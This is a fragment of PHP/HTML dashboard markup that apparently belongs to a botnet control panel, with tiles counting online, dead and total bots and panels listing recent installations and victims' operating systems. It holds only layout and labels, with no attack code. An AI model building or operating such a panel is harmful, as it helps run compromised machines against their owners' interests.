...
?>
        ...
        <div class="container">
           ...
           <div class="row"> 
            ...
            <div class="card-content center-align" style="word-wrap: break-word;">
              ...
              <p class="white-text" style="font-size: 15px;"><i class="mdi-action-settings-input-antenna"></i>&nbsp;&nbsp;Bots Online</p>
            </div>
          </div>
        </div>
        <div class="col s12 m6 l3">
          <div class="card purple lighten-1 hoverable">
            <div class="card-content center-align" style="word-wrap: break-word;">
              ...
              <p class="white-text" style="font-size: 15px;"><i class="mdi-communication-portable-wifi-off"></i>&nbsp;&nbsp;Dead Bots</p>
            </div>
          </div>
        </div>
        <div class="col s12 m6 l3">
          <div class="card orange lighten-1 hoverable">
            <div class="card-content center-align" style="word-wrap: break-word;">
              ...
              <p class="white-text" style="font-size: 15px;"><i class="mdi-action-settings-input-composite"></i>&nbsp;&nbsp;Total Bots</p>
            </div>
          </div>
        </div>
       <div class="col s12 m6 l3">
          <div class="card green lighten-1 hoverable">
            <div class="card-content center-align" style="word-wrap: break-word;">
              ...
              <p class="white-text" style="font-size: 15px;"><i class="mdi-social-people-outline"></i>&nbsp;&nbsp;Users</p>
            </div>
          </div>
        </div>
            </div>
          ...
          <div class="card">
            <div class="card-content ersr">
              <span class="purple-text card-title">Last 5 Installations</span>
	...
	<div class="col s12 m6 l6">
          <div class="card">
            <div class="card-content ersr">
              <span class="purple-text card-title">Top 10 Operating Systems</span>
              <div class="divider"></div>              
